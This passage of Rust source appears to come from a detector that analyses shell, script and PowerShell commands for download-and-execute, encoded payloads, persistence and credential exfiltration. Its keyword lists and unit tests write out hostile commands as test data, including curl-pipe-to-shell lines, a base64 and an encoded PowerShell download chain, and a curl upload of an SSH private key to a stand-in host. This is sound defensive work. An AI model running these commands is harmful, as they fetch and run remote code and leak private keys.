            after_c || (kind == SubstKind::ProcIn && v.first_operand() == Some(ai))
        }
        Kind::Script => {
            let after_code_flag = ai > 0
                && matches!(
                    v.args[ai - 1].text.as_str(),
                    "-c" | "-e" | "-E" | "--eval" | "-r" | "-p"
                );
            after_code_flag || (kind == SubstKind::ProcIn && v.first_operand() == Some(ai))
        }
        Kind::PowerShell | Kind::Cmd => true,
        Kind::Other => {
            // `ssh host "$(...)"` etc. are not local execution.
            let _ = cmd;
            false
        }
    }
}

/// `-c` / `-e` / `-Command` / `-EncodedCommand` / `/c` payloads.
fn code_args(ctx: &mut Ctx, v: &View, depth: u32, facts: &mut Facts) {
    match v.kind {
        Kind::Shell => {
            if let Some(i) = v.args.iter().position(|w| short_flag_has(&w.text, 'c')) {
                if let Some(code) = v.arg(i + 1) {
                    let f = analyze_text(ctx, code, depth + 1, Dialect::Posix);
                    facts.merge(f);
                }
            }
        }
        Kind::Script => {
            let mut i = 0;
            while i < v.args.len() {
                if matches!(
                    v.args[i].text.as_str(),
                    "-c" | "-e" | "-E" | "--eval" | "-r" | "-p"
                ) {
                    if let Some(code) = v.arg(i + 1) {
                        script_code(ctx, &v.name, code, depth, facts);
                    }
                    i += 1;
                }
                i += 1;
            }
        }
        Kind::PowerShell => {
            let mut i = 0;
            while i < v.args.len() {
                let a = v.args[i].text.as_str();
                if is_ps_param(a, "encodedcommand") {
                    if let Some(b) = v.arg(i + 1) {
                        if let Some(bytes) = decode::base64(b) {
                            let t = decode::utf16le(&bytes);
                            ctx.signals |= sig::ENCODED_COMMAND;
                            if let Some(f) = decoded(ctx, "decoded -EncodedCommand", &t, depth) {
                                facts.merge(f);
                            }
                        }
                    }
                    i += 2;
                    continue;
                }
                if is_ps_param(a, "windowstyle") {
                    if let Some(val) = v.arg(i + 1) {
                        let l = val.to_ascii_lowercase();
                        if l.starts_with('h') || l == "1" || l.starts_with("mi") {
                            ctx.signals |= sig::HIDDEN_WINDOW;
                        }
                    }
                    i += 2;
                    continue;
                }
                if is_ps_param(a, "command") || !a.starts_with('-') {
                    let start = if a.starts_with('-') { i + 1 } else { i };
                    let code = v.args[start.min(v.args.len())..]
                        .iter()
                        .map(|w| w.text.as_str())
                        .collect::<Vec<_>>()
                        .join(" ");
                    if !code.is_empty() {
                        let f = analyze_text(ctx, &code, depth + 1, Dialect::PowerShell);
                        facts.merge(f);
                    }
                    break;
                }
                i += 1;
                // Parameters that take a value.
                if matches!(
                    a.to_ascii_lowercase().as_str(),
                    "-executionpolicy"
                        | "-ep"
                        | "-exec"
                        | "-ex"
                        | "-version"
                        | "-v"
                        | "-inputformat"
                        | "-outputformat"
                        | "-configurationname"
                ) {
                    i += 1;
                }
            }
        }
        Kind::Cmd => {
            if let Some(i) = v
                .args
                .iter()
                .position(|w| matches!(w.text.to_ascii_lowercase().as_str(), "/c" | "/k" | "/r"))
            {
                let code = v.args[i + 1..]
                    .iter()
                    .map(|w| w.text.as_str())
                    .collect::<Vec<_>>()
                    .join(" ");
                let stripped: String = code.chars().filter(|&c| c != '^').collect();
                if stripped.len() != code.len() {
                    ctx.signals |= sig::OBFUSCATION;
                }
                let f = analyze_text(ctx, &stripped, depth + 1, Dialect::Cmd);
                facts.merge(f);
            }
        }
        Kind::EvalLike if matches!(v.name.as_str(), "eval" | "iex" | "invoke-expression") => {
            let code = v
                .args
                .iter()
                .map(|w| w.text.as_str())
                .collect::<Vec<_>>()
                .join(" ");
            if !code.trim().is_empty() && code.trim() != lex::SUBST_MARK.to_string() {
                let f = analyze_text(ctx, &code, depth + 1, dialect_for(&v.name));
                facts.merge(f);
            }
        }
        _ => match v.name.as_str() {
            "su" | "runuser" | "script" => {
                if let Some(code) = v.value(&["-c", "--command"]) {
                    let f = analyze_text(ctx, code, depth + 1, Dialect::Posix);
                    facts.merge(f);
                }
            }
            "screen" | "tmux" | "start" | "conhost" | "xterm" | "gnome-terminal" | "konsole"
            | "at" | "watch" | "systemd-run" | "start-process" | "saps" => {
                if matches!(v.name.as_str(), "screen" | "tmux" | "systemd-run") {
                    ctx.signals |= sig::BACKGROUND_DETACH;
                }
                if v.name == "start" && v.has_ci(&["/min", "/b"]) {
                    ctx.signals |= sig::HIDDEN_WINDOW;
                }
                let code = v
                    .args
                    .iter()
                    .filter(|w| {
                        !(w.text.starts_with('-') || (w.text.starts_with('/') && w.text.len() <= 4))
                    })
                    .map(|w| w.text.as_str())
                    .collect::<Vec<_>>()
                    .join(" ");
                if code.len() >= 4 {
                    let f = analyze_text(ctx, &code, depth + 1, Dialect::Auto);
                    facts.merge(f);
                }
            }
            "ssh" => {}
            _ => {}
        },
    }
    if v.name == "osascript" {
        for (i, w) in v.args.iter().enumerate() {
            if w.text == "-e" {
                if let Some(code) = v.arg(i + 1) {
                    let l = code.to_ascii_lowercase();
                    if let Some(p) = l.find("do shell script") {
                        let rest = &code[p + 15..];
                        let inner = rest.trim_start().trim_start_matches(['"', '\'']);
                        let end = inner.rfind(['"', '\'']).unwrap_or(inner.len());
                        let f = analyze_text(ctx, &inner[..end], depth + 1, Dialect::Posix);
                        facts.merge(f);
                    }
                }
            }
        }
    }
}

fn dialect_for(name: &str) -> Dialect {
    if matches!(name, "iex" | "invoke-expression") {
        Dialect::PowerShell
    } else {
        Dialect::Posix
    }
}

/// Inline code for python/node/perl/ruby/php: network + exec = download_exec.
fn script_code(ctx: &mut Ctx, _name: &str, code: &str, depth: u32, facts: &mut Facts) {
    let l = code.to_ascii_lowercase();
    const NET: &[&str] = &[
        "urllib",
        "urlopen",
        "requests.get",
        "requests.post",
        "http.client",
        "httpx",
        "socket",
        "fetch(",
        "https.get",
        "http.get",
        "require('http",
        "require(\"http",
        "lwp",
        "io::socket",
        "open-uri",
        "net::http",
        "file_get_contents('http",
        "file_get_contents(\"http",
        "curl_exec",
        "nsurl",
        "wget",
        "curl ",
    ];
    const EXEC: &[&str] = &[
        "exec(",
        "eval(",
        "os.system",
        "subprocess",
        "popen",
        "child_process",
        "execsync",
        "spawn(",
        "new function",
        "vm.run",
        "system(",
        "shell_exec",
        "passthru",
        "__import__('os')",
        "__import__(\"os\")",
        "`",
        "do shell script",
    ];
    const B64: &[&str] = &[
        "b64decode",
        "atob(",
        "'base64')",
        "\"base64\")",
        "decode_base64",
        "base64_decode",
        "unpack('m",
        "frombase64",
    ];
    let net = NET.iter().any(|s| l.contains(s));
    let exec = EXEC.iter().any(|s| l.contains(s));
    let b64 = B64.iter().any(|s| l.contains(s));
    if net {
        ctx.signals |= sig::DOWNLOAD;
        facts.download = true;
    }
    if net && exec {
        ctx.signals |= sig::DOWNLOAD_EXEC;
        facts.exec = true;
    }
    if b64 && exec {
        ctx.signals |= sig::DECODE_EXEC;
        facts.exec = true;
    }
    // Decode embedded base64 string literals.
    for lit in code
        .split(['\'', '"'])
        .filter(|s| s.len() >= 24 && decode::looks_base64(s))
        .take(4)
    {
        if let Some(t) = decode::base64_text(lit) {
            ctx.signals |= sig::ENCODED_COMMAND;
            if let Some(f) = decoded(ctx, "decoded base64", &t, depth) {
                facts.merge(f);
            }
        }
    }
}

/// Decode a literal that is fed into a decoder. If it is then executed,
/// analyse the decoded code fully; otherwise only reveal it.
fn decode_literal(ctx: &mut Ctx, lit: &str, depth: u32, executed: bool) {
    let t = decode::base64_text(lit).or_else(|| decode::hex_text(lit));
    let Some(t) = t else { return };
    let risky = text::risky(&t.to_ascii_lowercase());
    if executed {
        ctx.signals |= sig::ENCODED_COMMAND;
        decoded(ctx, "decoded", &t, depth);
    } else if risky {
        ctx.signals |= sig::ENCODED_COMMAND;
        ctx.add_hidden("decoded", &t);
    }
}

/// A free-standing base64 argument that decodes to something risky.
fn blob(ctx: &mut Ctx, t: &str, _depth: u32) {
    if t.len() < 40 || !decode::looks_base64(t) {
        return;
    }
    if let Some(d) = decode::base64_text(t) {
        if text::risky(&d.to_ascii_lowercase()) {
            ctx.signals |= sig::ENCODED_COMMAND;
            ctx.add_hidden("decoded", &d);
        }
    }
}

/// Bare hosts given to downloaders (`irm get.example.com`).
fn bare_hosts(ctx: &mut Ctx, v: &View) {
    const TAKES_VALUE: &[&str] = &[
        "-o",
        "-O",
        "--output",
        "-H",
        "--header",
        "-d",
        "--data",
        "-u",
        "--user",
        "-A",
        "--user-agent",
        "-X",
        "--request",
        "-e",
        "--referer",
        "-b",
        "--cookie",
        "-c",
        "--cookie-jar",
        "-x",
        "--proxy",
        "-T",
        "-F",
        "--form",
        "-w",
        "--write-out",
        "--connect-timeout",
        "-m",
        "--max-time",
        "--retry",
        "-P",
        "-outfile",
        "-method",
        "-headers",
        "-body",
        "-useragent",
        "--output-document",
    ];
    let mut skip = false;
    for w in v.args {
        let t = w.text.as_str();
        if skip {
            skip = false;
            continue;
        }
        if t.starts_with('-') {
            skip = TAKES_VALUE.iter().any(|f| t.eq_ignore_ascii_case(f));
            continue;
        }
        if t.contains("://")
            || t.starts_with('/')
            || t.starts_with('.')
            || t.starts_with('~')
            || t.starts_with('$')
            || t.contains(lex::SUBST_MARK)
        {
            continue;
        }
        let host = t.split('/').next().unwrap_or("");
        let looks_host = host.contains('.')
            && host.len() <= 253
            && host
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b':')
            && host.rsplit('.').next().is_some_and(|tld| {
                tld.len() >= 2
                    && tld
                        .bytes()
                        .all(|b| b.is_ascii_alphabetic() || b == b':' || b.is_ascii_digit())
            });
        if looks_host {
            let u = format!("https://{t}");
            if !ctx.urls.contains(&u) {
                ctx.urls.push(u);
            }
        }
    }
}

/// curl/wget uploading data (beacons) or private files (exfiltration).
fn uploads(ctx: &mut Ctx, v: &View) {
    if !matches!(
        v.name.as_str(),
        "curl" | "wget" | "wget2" | "http" | "https" | "xh"
    ) {
        return;
    }
    const DATA: &[&str] = &[
        "-d",
        "--data",
        "--data-raw",
        "--data-binary",
        "--data-urlencode",
        "-F",
        "--form",
        "--form-string",
        "-T",
        "--upload-file",
        "--post-data",
        "--post-file",
        "--json",
    ];
    for (i, w) in v.args.iter().enumerate() {
        let t = w.text.as_str();
        let (flag, val) = match t.split_once('=') {
            Some((f, val)) if f.starts_with("--") => (f, Some(val)),
            _ => (t, v.arg(i + 1)),
        };
        if DATA.contains(&flag)
            || (flag == "-X"
                && val.is_some_and(|m| {
                    m.eq_ignore_ascii_case("post") || m.eq_ignore_ascii_case("put")
                }))
        {
            ctx.posts = true;
            if let Some(val) = val {
                let file = val.rsplit_once('@').map_or(
                    if matches!(flag, "-T" | "--upload-file" | "--post-file") {
                        val
                    } else {
                        ""
                    },
                    |(_, f)| f,
                );
                if !file.is_empty() && sensitive_path(file) {
                    ctx.signals |= sig::CREDENTIAL_EXFIL;
                }
            }
        }
    }
}

/// Private files sent over the network by other means.
fn exfil(ctx: &mut Ctx, v: &View, cmd: &Command) {
    match v.name.as_str() {
        "nc" | "ncat" | "netcat" | "socat" | "telnet" => {
            if cmd
                .redirs
                .iter()
                .any(|r| r.kind == RedirKind::In && sensitive_path(&r.target.text))
            {
                ctx.signals |= sig::CREDENTIAL_EXFIL;
            }
        }
        "scp" | "rsync" | "sftp" => {
            let ops: Vec<&str> = v
                .args
                .iter()
                .map(|w| w.text.as_str())
                .filter(|t| !t.starts_with('-'))
                .collect();
            if ops.len() >= 2 {
                let dest = ops[ops.len() - 1];
                let remote = dest.contains(':') && !dest.starts_with('/');
                if remote && ops[..ops.len() - 1].iter().any(|s| sensitive_path(s)) {
                    ctx.signals |= sig::CREDENTIAL_EXFIL;
                }
            }
        }
        "iwr" | "invoke-webrequest" | "irm" | "invoke-restmethod" => {
            if let Some(i) = v
                .args
                .iter()
                .position(|w| w.text.eq_ignore_ascii_case("-infile"))
            {
                ctx.posts = true;
                if v.arg(i + 1).is_some_and(sensitive_path) {
                    ctx.signals |= sig::CREDENTIAL_EXFIL;
                }
            }
        }
        _ => {}
    }
}

fn redirect_persistence(ctx: &mut Ctx, cmd: &Command) -> bool {
    let mut hit = false;
    for r in &cmd.redirs {
        if matches!(r.kind, RedirKind::Out | RedirKind::Append) {
            let s = path_signal(&r.target.text);
            if s != 0 {
                ctx.signals |= s;
                hit = true;
            }
        }
    }
    hit
}

fn command_persistence(ctx: &mut Ctx, v: &View) -> bool {
    let mut s = 0;
    match v.name.as_str() {
        "cp" | "mv" | "install" | "ln" | "rsync" => {
            let ops: Vec<&str> = v
                .args
                .iter()
                .map(|w| w.text.as_str())
                .filter(|t| !t.starts_with('-'))
                .collect();
            if ops.len() >= 2 {
                s |= path_signal(ops[ops.len() - 1]);
            }
        }
        "dd" => {
            if let Some(w) = v.args.iter().find(|w| w.text.starts_with("of=")) {
                s |= path_signal(&w.text[3..]);
            }
        }
        "sed" | "perl" if v.args.iter().any(|w| w.text.starts_with("-i")) => {
            for w in v.args {
                s |= path_signal(&w.text);
            }
        }
        "launchctl"
            if v.args
                .iter()
                .any(|w| matches!(w.text.as_str(), "load" | "bootstrap" | "submit")) =>
        {
            s |= sig::PERSISTENCE
        }
        "schtasks" if v.has_ci(&["/create"]) => s |= sig::PERSISTENCE,
        "reg"
            if v.args.iter().any(|w| w.text.eq_ignore_ascii_case("add"))
                && v.args
                    .iter()
                    .any(|w| path_signal(&w.text) == sig::PERSISTENCE) =>
        {
            s |= sig::PERSISTENCE
        }
        "set-itemproperty" | "new-itemproperty" | "sp" | "set-content" | "add-content"
        | "out-file" | "copy-item" | "move-item" => {
            for w in v.args {
                s |= path_signal(&w.text);
            }
        }
        "curl" | "wget" | "wget2" => {
            if let Some(f) = v.value(&["-o", "--output", "-O"]) {
                s |= path_signal(f);
            }
        }
        _ => {}
    }
    ctx.signals |= s;
    s != 0
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sigs(s: &str) -> u64 {
        let mut ctx = Ctx::new(Dialect::Auto);
        analyze_text(&mut ctx, s, 0, Dialect::Auto);
        ctx.finish();
        ctx.signals
    }

    #[test]
    fn pipe_to_shell() {
        assert_ne!(
            sigs("curl -fsSL https://a.example/x | sh") & sig::DOWNLOAD_EXEC,
            0
        );
        assert_ne!(
            sigs("wget -qO- https://a.example/x | sudo -E bash -") & sig::DOWNLOAD_EXEC,
            0
        );
        assert_eq!(
            sigs("curl -s https://api.example/x | jq .a") & sig::DOWNLOAD_EXEC,
            0
        );
        assert_eq!(
            sigs("curl -s https://api.example/x | python3 -m json.tool") & sig::DOWNLOAD_EXEC,
            0
        );
        assert_eq!(sigs("curl -fsSL https://a.example/key.gpg | sudo gpg --dearmor -o /etc/apt/keyrings/a.gpg") & sig::DOWNLOAD_EXEC, 0);
    }

    #[test]
    fn substitution_exec() {
        assert_ne!(
            sigs(r#"/bin/bash -c "$(curl -fsSL https://a.example/i.sh)""#) & sig::DOWNLOAD_EXEC,
            0
        );
        assert_ne!(
            sigs("bash <(curl -s https://a.example/x)") & sig::DOWNLOAD_EXEC,
            0
        );
        assert_ne!(
            sigs(r#"eval "$(wget -qO- https://a.example/x)""#) & sig::DOWNLOAD_EXEC,
            0
        );
        assert_eq!(sigs(r#"eval "$(ssh-agent -s)""#) & sig::DOWNLOAD_EXEC, 0);
        assert_eq!(
            sigs(r#"echo "$(curl -s https://ifconfig.example)""#) & sig::DOWNLOAD_EXEC,
            0
        );
    }

    #[test]
    fn download_then_run() {
        assert_ne!(
            sigs("curl -o /tmp/x https://a.example/x && chmod +x /tmp/x && /tmp/x")
                & sig::DOWNLOAD_EXEC,
            0
        );
        assert_ne!(
            sigs("wget https://a.example/setup.sh && bash setup.sh") & sig::DOWNLOAD_EXEC,
            0
        );
        assert_eq!(
            sigs("wget https://a.example/file.tar.gz && tar xzf file.tar.gz") & sig::DOWNLOAD_EXEC,
            0
        );
    }

    #[test]
    fn base64_chain() {
        // echo "curl https://a.example | sh" | base64
        let s = sigs("echo Y3VybCBodHRwczovL2EuZXhhbXBsZSB8IHNo | base64 -d | bash");
        assert_ne!(s & sig::DECODE_EXEC, 0);
        assert_ne!(s & sig::DOWNLOAD_EXEC, 0);
        assert_eq!(
            sigs("echo aGVsbG8gd29ybGQ= | base64 -d") & (sig::DECODE_EXEC | sig::ENCODED_COMMAND),
            0
        );
    }

    #[test]
    fn persistence() {
        assert_ne!(
            sigs("echo '[Desktop Entry]' > ~/.config/autostart/x.desktop") & sig::PERSISTENCE,
            0
        );
        assert_ne!(
            sigs(r#"(crontab -l; echo "* * * * * curl -s https://a.example | sh") | crontab -"#)
                & sig::PERSISTENCE,
            0
        );
        assert_ne!(
            sigs("echo 'export PATH=$HOME/bin:$PATH' >> ~/.bashrc") & sig::RC_WRITE,
            0
        );
        assert_eq!(
            sigs("cat ~/.bashrc") & (sig::RC_WRITE | sig::PERSISTENCE),
            0
        );
    }

    #[test]
    fn exfil() {
        assert_ne!(
            sigs("curl -F f=@$HOME/.ssh/id_ed25519 https://a.example/u") & sig::CREDENTIAL_EXFIL,
            0
        );
        assert_eq!(
            sigs("scp ~/.ssh/id_ed25519.pub user@host:") & sig::CREDENTIAL_EXFIL,
            0
        );
    }

    #[test]
    fn powershell() {
        assert_ne!(
            sigs(r#"powershell -w h -c "iex(irm https://a.example/x)""#)
                & (sig::DOWNLOAD_EXEC | sig::HIDDEN_WINDOW),
            0
        );
        // "iex(irm https://a.example)" UTF-16LE base64
        let s = sigs("powershell -enc aQBlAHgAKABpAHIAbQAgAGgAdAB0AHAAcwA6AC8ALwBhAC4AZQB4AGEAbQBwAGwAZQApAA==");
        assert_ne!(s & sig::ENCODED_COMMAND, 0);
        assert_ne!(s & sig::DOWNLOAD_EXEC, 0);
    }
}
